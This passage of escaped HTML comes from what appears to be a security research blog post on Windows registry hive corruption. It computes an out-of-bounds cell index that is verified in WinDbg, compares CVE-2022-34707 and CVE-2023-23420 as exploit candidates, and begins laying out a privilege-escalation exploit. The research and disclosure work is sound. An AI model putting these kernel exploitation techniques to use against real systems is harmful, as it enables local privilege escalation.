ormwWEjHLs-c2&quot;&gt;offset):&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;print(&amp;quot;0x%x&amp;quot;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;((storage&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;31)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(directory&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;21)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(table&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;12)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;offset))&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;...&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;And then pass the values we have established so far:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ormwWEjHLs-c19&quot;&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c11&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;MakeCellIndex(1,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0x193,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;3,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0xb2603000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;So the final out-of-bounds cell index pointing to the _CMHIVE structure of a given hive is &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c17&quot;&gt;0xB2603000&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;It is now time to verify in WinDbg whether this magic index actually works as intended.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ormwWEjHLs-c19&quot;&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c11&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;!reg&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;cellindex&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2 ormwWEjHLs-c37&quot;&gt;ffff82828fc1a000&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;b2603000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Map&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff82828fc1a3a0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Table&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;193&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Offset&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;MapTable&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff82828fdcc8e0&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;MapEntry&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff82828fdcc928&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;BinAddress&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff82828fc1a000,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;BlockOffset&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0000000000000000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;BlockAddress&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff82828fc1a000&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;pcell:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2 ormwWEjHLs-c37&quot;&gt;ffff82828fc1a004&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;Indeed, the _CMHIVE address passed as the input of the command was also printed in its output, which means that our technique works (the extra 0x4 in the output address is there to account for the cell size).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;If we were to insert this index into the _CM_KEY_VALUE.Data field, we would gain the ability to read from and write to the _CMHIVE structure in kernel memory through the registry value.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This represents a very powerful capability in the hands of a local attacker.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;ormwWEjHLs-c31&quot; id=&quot;h.xg17uxaglrd8&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c38&quot;&gt;Writing the exploit&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;At this stage, we already have a solid plan for how to leverage the initial primitive of hive memory corruption for further privilege escalation. It&amp;#39;s time to choose a specific vulnerability and begin writing an actual exploit for it. This process is described in detail below.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;ormwWEjHLs-c24&quot; id=&quot;h.9fdsd42jae0d&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c14 ormwWEjHLs-c35&quot;&gt;Step 0: Choosing the vulnerability&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;Faced with approximately &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues?q=CVE-2022-34707%20OR%20CVE-2022-34708%20OR%20CVE-2022-37956%20OR%20CVE-2022-37988%20OR%20CVE-2022-38037%20OR%20CVE-2023-21675%20OR%20CVE-2023-21748%20OR%20CVE-2023-23420%20OR%20CVE-2023-23421%20OR%20CVE-2023-23422%20OR%20CVE-2023-23423%20OR%20CVE-2023-28248%20OR%20CVE-2023-35382%20OR%20CVE-2023-38139%20OR%20CVE-2024-26182%20OR%20%20CVE-2024-43641%20OR%20CVE-2024-49114&quot;&gt;17 vulnerabilities&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&amp;nbsp;related to hive memory corruption, the immediate challenge is selecting one for a demonstration exploit. While any of these bugs could eventually be exploited with time and experimentation, they vary in difficulty. There is also an aesthetic consideration: for demonstration purposes, it would be ideal if the exploit&amp;#39;s actions were visible within Regedit, which narrows our options. Nevertheless, with a significant selection still available, we should be able to identify a suitable candidate. Let&amp;#39;s briefly examine two distinct possibilities.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;ormwWEjHLs-c18&quot; id=&quot;h.pl22c6m3z2mj&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c27 ormwWEjHLs-c14&quot;&gt;CVE-2022-34707&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;The first vulnerability that always comes to my mind in the context of the registry is &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451423&quot;&gt;CVE-2022-34707&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This is partly because it was the first bug I manually discovered as part of this research, but mainly because it is incredibly convenient to exploit.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The essence of this bug is that it was possible to load a hive with a security descriptor containing a refcount very close to the maximum 32-bit value (e.g., 0xFFFFFFFF), and then overflow it by creating a few more keys that used it.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This resulted in a very powerful UAF primitive, as the incorrectly freed cell could be subsequently filled with new objects and then freed again any number of times.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In this way, it was possible to achieve type confusion of several different types of objects, e.g., by reusing the same cell subsequently as a security descriptor &amp;rarr; value node &amp;rarr; value data backing cell, we could easily gain control over the _CM_KEY_VALUE structure, allowing us to continue the attack using out-of-bounds cell indexes.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;Due to its characteristics, this bug was also the first vulnerability in this research for which I wrote a full-fledged exploit. Many of the techniques I describe here were discovered while working on this bug. Furthermore, the screenshot showing the privilege escalation at the end of &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2024/04/the-windows-registry-adventure-1.html&quot;&gt;blog post #1&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&amp;nbsp;illustrates the successful exploitation of CVE-2022-34707. However, in the context of this blog post, it has one fundamental flaw: to set the initial refcount to a value close to overflowing the 32-bit range, it is necessary to manually craft the input regf file. This means that the target can only be an app hive, and thus we wouldn&amp;#39;t be able to directly observe the exploitation in the Registry Editor. This would greatly reduce my ability to visually demonstrate the exploit, which is what ultimately led me to look for a better bug.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;ormwWEjHLs-c18&quot; id=&quot;h.41a8dwwig05r&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c27 ormwWEjHLs-c14&quot;&gt;CVE-2023-23420&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;This brings us to the second vulnerability, &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451531&quot;&gt;CVE-2023-23420&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This is also a UAF condition within the hive, but it concerns a key node cell instead of a security descriptor cell.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;It was caused by certain issues in the transactional key rename operation.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;These problems were so deep and affected such fundamental aspects of the registry that this and the related vulnerabilities CVE-2023-23421, &lt;/span&gt;&lt;span&gt;CVE-2023-&lt;/span&gt;&lt;span&gt;23422 and &lt;/span&gt;&lt;span&gt;CVE-2023-&lt;/span&gt;&lt;span&gt;23423 were fixed by completely removing support for transacted key rename operations.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c36 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;In terms of exploitation, this bug is particularly unique because it can be triggered using only API/system calls, making it possible to corrupt any hive the attacker has write access to.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This makes it an ideal candidate for writing an exploit whose operation is visible to the naked eye using standard Windows registry utilities, so that&amp;#39;s what we&amp;#39;ll do.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Although the details of massaging the hive layout into the desired state may be slightly more difficult here than with CVE-2022-34707, it&amp;#39;s nothing we can&amp;#39;t handle.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;So let&amp;#39;s get to work!&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;ormwWEjHLs-c24&quot; id=&quot;h.kahjj64tbd5f&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c35 ormwWEjHLs-c14&quot;&gt;Step 1: Abusing the UAF to establish dynamically-controlled value cells&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;Let&amp;#39;s start by clarifying that our attack will target the HKCU hive, and more specifically its volatile storage space. This will hopefully make the exploit a bit more reliable, as the volatile space resets each time the hive is reloaded, and there generally isn&amp;#39;t much activity occurring there. The exploitation process begins with a key node use-after-free, and our goal is to take full control over the _CM_KEY_VALUE representation of two registry values by the end of the first stage (why two &amp;ndash; we&amp;#39;ll get to that in a moment). Once we achieve this goal, we will be able to arbitrarily set the _CM_KEY_VALUE.Data field, and thus gain read/write access to any chosen out-of-bounds cell index. There are many different approaches to how to achieve this, but in my proof-of-concept, I started with the following data layout:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c8&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhQ_dqMOzKFnvGs01xwlT8WAKo8-kygpa_47K4FoMXrGbXIgyaqsvOmLFSfFHY3_WrD9i9Radngi5B9TOiOxQjLIlwoyL6Hn0FNVqBC5qab26KN5kJ1c8sHJ4CNZZi4M6R0CYheXK1_tUhdz32hNXbjWb0rcq7vNNRNzRIxxczfeDIlkyFYBK-uNfT-qcE/s1535/image7.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhQ_dqMOzKFnvGs01xwlT8WAKo8-kygpa_47K4FoMXrGbXIgyaqsvOmLFSfFHY3_WrD9i9Radngi5B9TOiOxQjLIlwoyL6Hn0FNVqBC5qab26KN5kJ1c8sHJ4CNZZi4M6R0CYheXK1_tUhdz32hNXbjWb0rcq7vNNRNzRIxxczfeDIlkyFYBK-uNfT-qcE/s1200/image7.png&quot; border=&quot;0&quot; alt=&quot;At the top left, a box labeled &amp;quot;Exploit&amp;quot; is designated as a &amp;quot;Key node,&amp;quot; with a dotted line extending upwards from its &amp;quot;Key node&amp;quot; label. An arrow from &amp;quot;Exploit&amp;quot; points to a box labeled &amp;quot;TmpKeyName,&amp;quot; also designated as a &amp;quot;Key node.&amp;quot; From &amp;quot;TmpKeyName,&amp;quot; two arrows point downwards to two separate &amp;quot;Key node&amp;quot; boxes: &amp;quot;SubKey1&amp;quot; and &amp;quot;SubKey2.&amp;quot; Another arrow extends to the right from &amp;quot;TmpKeyName&amp;quot; to a vertically stacked group of four rectangular elements, collectively referred to as a &amp;quot;Value list&amp;quot; via a label to their left. From this &amp;quot;Value list,&amp;quot; four separate arrows point to the right, each connecting to a distinct container box. Each of these container boxes has a &amp;quot;Value node&amp;quot; label above it: The first container is &amp;quot;FakeKeyContainer.&amp;quot; The second is &amp;quot;ValueListContainer.&amp;quot; The third is &amp;quot;KernelAddrContainer.&amp;quot; The fourth is &amp;quot;KernelDataContainer.&amp;quot;&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;At the top left, a box labeled &amp;quot;Exploit&amp;quot; is designated as a &amp;quot;Key node,&amp;quot; with a dotted line extending upwards from its &amp;quot;Key node&amp;quot; label. An arrow from &amp;quot;Exploit&amp;quot; points to a box labeled &amp;quot;TmpKeyName,&amp;quot; also designated as a &amp;quot;Key node.&amp;quot; From &amp;quot;TmpKeyName,&amp;quot; two arrows point downwards to two separate &amp;quot;Key node&amp;quot; boxes: &amp;quot;SubKey1&amp;quot; and &amp;quot;SubKey2.&amp;quot; Another arrow extends to the right from &amp;quot;TmpKeyName&amp;quot; to a vertically stacked group of four rectangular elements, collectively referred to as a &amp;quot;Value list&amp;quot; via a label to their left. From this &amp;quot;Value list,&amp;quot; four separate arrows point to the right, each connecting to a distinct container box. Each of these container boxes has a &amp;quot;Value node&amp;quot; label above it: The first container is &amp;quot;FakeKeyContainer.&amp;quot; The second is &amp;quot;ValueListContainer.&amp;quot; The third is &amp;quot;KernelAddrContainer.&amp;quot; The fourth is &amp;quot;KernelDataContainer.&amp;quot;&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
